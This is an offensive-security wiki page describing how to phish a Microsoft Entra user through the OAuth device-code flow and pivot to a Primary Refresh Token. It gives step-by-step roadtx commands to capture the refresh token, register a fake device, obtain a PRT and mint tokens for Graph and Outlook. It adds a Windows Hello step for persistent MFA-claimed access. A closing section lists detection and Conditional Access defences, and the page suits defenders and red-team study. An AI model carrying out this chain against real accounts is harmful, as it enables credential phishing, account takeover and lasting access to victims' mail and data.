---
title: Device-code → PRT pivot (Entra)
slug: entra-device-code-prt-pivot
---

> **TL;DR:** Phish a user through the OAuth device-code flow, register a fake Windows device with their refresh token, then exchange the device key + a fresh refresh for a Primary Refresh Token that quietly SSOs into every M365 app.

## What it is
Entra's device-code grant lets a public client request a `device_code` + `user_code` and the user authorises via `microsoft.com/devicelogin`. The resulting refresh token is normally bound to a non-device client (`Microsoft Office`), but Dirk-jan Mollema showed in 2024 that you can use it to register a *device* in Entra via `DRS` (Device Registration Service), receive a device transport key + certificate, and then request a Primary Refresh Token. The PRT plus session key behave like the user's domain-joined laptop: silent SSO across Outlook/SharePoint/Teams/Graph, ability to satisfy device-compliance Conditional Access, and (with a WHfB key registered) MFA-strong claims without ever prompting the user again.

## Preconditions / where it applies
- Tenant has device-code grant enabled for the targeted client (default).
- No Conditional Access rule blocking device-code flow or requiring compliant devices on first contact.
- A way to deliver the `user_code` URL (Teams DM, calendar invite, lookalike CLI prompt).

## Technique
1. Mint a device-code request against a first-party client.
2. Lure the victim into completing the verification page.
3. Use the resulting refresh token with ROADtools' `roadtx` to: register a device, obtain transport/session keys, request a PRT, then exchange the PRT for tokens to any resource.

```bash
# roadtx — start the device-code flow
roadtx devicecode -c 1b730954-1685-4b74-9bfd-dac224a7b894     # 'Azure Active Directory PowerShell'
# Prints user_code and verification URL; send to victim.

# Poll until they sign in — refresh token saved to .roadtools_auth
roadtx devicecode -c 1b730954-... --poll
```

```bash
# Register a fake Windows device using the harvested refresh token
roadtx device -a register --name pwnbox --os Windows
# Produces a .pem device cert + transport key

# Request a PRT and session key
roadtx prt -c <devicecert>.pem -k <devicekey>.pem -u victim@target.com
# Cookies / tokens stored in .roadtools_auth
```

```bash
# Use the PRT to mint tokens for arbitrary resources
roadtx prtauth -r https://graph.microsoft.com -c 1b730954-...
roadtx browserprtauth -url https://outlook.office.com   # full browser SSO
```

Adding a Windows Hello for Business key via `roadtx winhello` makes the PRT MFA-claimed, which satisfies most Conditional Access policies and grants persistence even after the user changes their password (the device + PRT live until explicitly revoked).

## Detection and defence
- Conditional Access: block device-code grant for non-IT user groups (it's almost never needed on user devices).
- Alert on Entra sign-in logs where `authenticationProtocol = deviceCode` from unexpected IPs, especially followed by `Add registered device` events within minutes.
- Continuous Access Evaluation + sign-in risk policies catch the cross-IP reuse pattern.
- Educate users: anyone sending a `microsoft.com/devicelogin` code over chat is phishing.
- Related: [[aws-sso-device-code-phishing]], [[entra-actor-token-cross-tenant]], [[app-registration-abuse]], [[entra-prt-cookie-theft]], [[oauth-foci-family-of-client-ids-abuse]], [[graphrunner-msgraph-redteam]].

## References
- [Dirk-jan Mollema — Phishing for Microsoft Entra Primary Refresh Tokens](https://dirkjanm.io/phishing-for-microsoft-entra-primary-refresh-tokens/) — original device-code → PRT chain with roadtx.
- [ROADtools / roadtx](https://github.com/dirkjanm/roadtools) — toolkit for device registration, PRT issuance, and token exchange.
